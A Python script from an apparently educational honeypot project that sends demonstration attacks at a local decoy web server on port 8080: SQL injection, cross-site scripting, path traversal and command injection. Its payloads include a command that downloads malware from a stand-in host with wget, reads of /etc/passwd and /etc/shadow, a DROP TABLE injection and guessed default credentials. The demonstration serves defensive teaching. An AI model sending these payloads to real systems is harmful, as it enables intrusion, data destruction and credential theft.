"""HTTP attack demonstrations.

Owned by Member One - drives SQL injection, cross-site scripting, path
traversal, command injection and credential-harvesting attacks against the
HTTP decoy on port 8080.
"""

import time
import urllib.parse
import urllib.request

from demos import common
from demos.common import BOLD, GREEN, RED, RESET, YELLOW


def safe_request(url, data=None):
    try:
        urllib.request.urlopen(url, data, timeout=5)
    except Exception:
        pass


def recon():
    common.attack_header(1, "Probing - Website Visit", "HTTP (port 8080)", "LOW")
    print(f"""
  {BOLD}What's happening:{RESET}
  An attacker discovers our web server and visits it.
  The honeypot serves a fake corporate login page to lure them in.

  {BOLD}Command equivalent:{RESET}
  curl http://localhost:8080/
    """)
    common.pause()
    safe_request('http://localhost:8080/')
    print(f"  {GREEN}[+] Attack sent! Check the dashboard live feed.{RESET}")
    time.sleep(1)


def admin_probe():
    common.attack_header(2, "Admin Panel Probing", "HTTP (port 8080)", "LOW")
    print(f"""
  {BOLD}What's happening:{RESET}
  The attacker tries common admin panel URLs to find a way in.
  This is a typical probing technique used by automated scanners.

  {BOLD}URLs being probed:{RESET}
  - /wp-admin     (WordPress admin)
  - /phpmyadmin   (Database admin)
  - /admin        (Generic admin)
  - /robots.txt   (Looking for hidden paths)
    """)
    common.pause()
    for path in ['/wp-admin', '/phpmyadmin', '/admin', '/robots.txt']:
        safe_request(f'http://localhost:8080{path}')
        print(f"  {GREEN}[+] Probed: {path}{RESET}")
        time.sleep(0.5)
    print(f"\n  {GREEN}[+] 4 probe attempts logged! Check the dashboard.{RESET}")
    time.sleep(1)


def sql_injection():
    common.attack_header(3, "SQL Injection Attack", "HTTP (port 8080)", "CRITICAL")
    print(f"""
  {BOLD}What's happening:{RESET}
  The attacker injects SQL code into the login form to bypass authentication.
  This is one of the OWASP Top 10 vulnerabilities.

  {BOLD}Malicious payloads:{RESET}
  - admin' OR '1'='1' --     (Authentication bypass)
  - 1; DROP TABLE users      (Data destruction)
  - ' UNION SELECT * FROM passwords  (Data exfiltration)

  {RED}Severity: CRITICAL - Could lead to full database compromise{RESET}
    """)
    common.pause()

    payloads = [
        ("admin' OR '1'='1", "Authentication bypass"),
        ("1; DROP TABLE users", "Table deletion"),
        ("' UNION SELECT * FROM passwords", "Data exfiltration"),
    ]

    for payload, desc in payloads:
        url = 'http://localhost:8080/login?user=' + urllib.parse.quote(payload)
        safe_request(url)
        print(f"  {RED}[!] SQL Injection: {desc}{RESET}")
        print(f"      Payload: {payload}")
        time.sleep(0.8)

    print(f"\n  {GREEN}[+] 3 SQL Injection attempts captured!{RESET}")
    time.sleep(1)


def xss():
    common.attack_header(4, "Cross-Site Scripting (XSS)", "HTTP (port 8080)", "HIGH")
    print(f"""
  {BOLD}What's happening:{RESET}
  The attacker injects JavaScript code to steal user cookies/sessions.
  If this were a real site, other users could be affected.

  {BOLD}Malicious payloads:{RESET}
  - <script>alert('XSS')</script>
  - <img src=x onerror=alert(document.cookie)>

  {RED}Severity: HIGH - Could steal user sessions{RESET}
    """)
    common.pause()

    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(document.cookie)>",
    ]
    for payload in xss_payloads:
        url = 'http://localhost:8080/search?q=' + urllib.parse.quote(payload)
        safe_request(url)
        print(f"  {RED}[!] XSS Payload: {payload}{RESET}")
        time.sleep(0.8)

    print(f"\n  {GREEN}[+] 2 XSS attempts captured!{RESET}")
    time.sleep(1)


def path_traversal():
    common.attack_header(5, "Path Traversal / Directory Traversal", "HTTP (port 8080)", "HIGH")
    print(f"""
  {BOLD}What's happening:{RESET}
  The attacker tries to navigate outside the web root to access
  sensitive system files like /etc/passwd or Windows system files.

  {BOLD}Malicious paths:{RESET}
  - /../../../etc/passwd
  - /../../../etc/shadow

  {RED}Severity: HIGH - Could expose system credentials{RESET}
    """)
    common.pause()

    paths = ['/../../../etc/passwd', '/../../../etc/shadow']
    for path in paths:
        safe_request('http://localhost:8080' + urllib.parse.quote(path))
        print(f"  {RED}[!] Path Traversal: {path}{RESET}")
        time.sleep(0.8)

    print(f"\n  {GREEN}[+] 2 Path Traversal attempts captured!{RESET}")
    time.sleep(1)


def command_injection():
    common.attack_header(6, "Command Injection", "HTTP (port 8080)", "CRITICAL")
    print(f"""
  {BOLD}What's happening:{RESET}
  The attacker injects OS commands through input fields,
  trying to execute arbitrary commands on the server.

  {BOLD}Malicious payloads:{RESET}
  - ; ls -la                (List files)
  - ; cat /etc/passwd       (Read passwords)
  - | wget malware.sh       (Download malware)

  {RED}Severity: CRITICAL - Full server compromise possible{RESET}
    """)
    common.pause()

    commands = ['; ls -la', '; cat /etc/passwd', '| wget http://evil.com/malware.sh']
    for command in commands:
        url = 'http://localhost:8080/cmd?exec=' + urllib.parse.quote(command)
        safe_request(url)
        print(f"  {RED}[!] Command Injection: {command}{RESET}")
        time.sleep(0.8)

    print(f"\n  {GREEN}[+] 3 Command Injection attempts captured!{RESET}")
    time.sleep(1)


def credential_harvesting():
    common.attack_header(7, "Credential Harvesting (HTTP Login)", "HTTP (port 8080)", "MEDIUM")
    print(f"""
  {BOLD}What's happening:{RESET}
  The attacker submits stolen/guessed credentials to the login form.
  Our honeypot captures every username and password they try.

  {BOLD}Login attempts:{RESET}
    """)
    common.pause()

    creds = [
        ('admin', 'admin123'),
        ('root', 'toor'),
        ('administrator', 'P@ssw0rd'),
        ('test', 'test123'),
    ]
    for user, password in creds:
        data = urllib.parse.urlencode({'username': user, 'password': password}).encode()
        safe_request('http://localhost:8080/login', data)
        print(f"  {YELLOW}[!] Login attempt: {user} / {password}{RESET}")
        time.sleep(0.6)

    print(f"\n  {GREEN}[+] 4 credential harvesting attempts captured!{RESET}")
    time.sleep(1)
